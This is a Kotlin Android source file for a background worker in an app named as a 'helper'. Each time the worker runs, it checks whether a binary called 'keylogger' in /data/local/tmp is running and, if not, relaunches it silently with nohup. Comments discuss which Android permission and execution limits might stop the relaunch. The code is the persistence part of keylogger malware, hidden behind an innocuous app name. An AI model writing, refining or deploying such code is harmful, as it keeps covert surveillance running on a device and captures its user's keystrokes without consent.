package com.jack.helper

import android.content.Context
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters
import java.io.BufferedReader
import java.io.InputStreamReader

class WatcherWorker(context: Context, workerParams: WorkerParameters) : Worker(context, workerParams) {

    override fun doWork(): Result {
        Log.d("FoxHelper", "WatcherWorker running...")
        
        val binaryName = "keylogger"
        val binaryPath = "/data/local/tmp/$binaryName"

        if (!isProcessRunning(binaryName)) {
            Log.d("FoxHelper", "Process $binaryName is NOT running. Attempting to restart...")
            startProcess(binaryPath)
        } else {
            Log.d("FoxHelper", "Process $binaryName is already running.")
        }

        return Result.success()
    }

    private fun isProcessRunning(processName: String): Boolean {
        try {
            // Note: 'ps' behavior is restricted on modern Android. 
            // This might only see processes owned by the same UID.
            // If the binary was started via ADB shell, it runs as 'shell' (UID 2000).
            // If the app runs it, it runs under the app's UID.
            val process = Runtime.getRuntime().exec("ps -A")
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            var line: String?
            while (reader.readLine().also { line = it } != null) {
                if (line?.contains(processName) == true) {
                    return true
                }
            }
            process.waitFor()
        } catch (e: Exception) {
            Log.e("FoxHelper", "Error checking process: ${e.message}")
        }
        return false
    }

    private fun startProcess(path: String) {
        try {
            // Attempt to execute the binary. 
            // This will fail if the app doesn't have execute permissions on the file,
            // or due to W^X restrictions if the file isn't in the app's native library dir.
            // Since ADB pushes to /data/local/tmp/, the app likely cannot execute it directly
            // unless the device is rooted or the binary is moved to the app's internal storage.
            Runtime.getRuntime().exec(arrayOf("sh", "-c", "nohup $path > /dev/null 2>&1 &"))
            Log.d("FoxHelper", "Executed restart command.")
        } catch (e: Exception) {
            Log.e("FoxHelper", "Failed to start process: ${e.message}")
        }
    }
}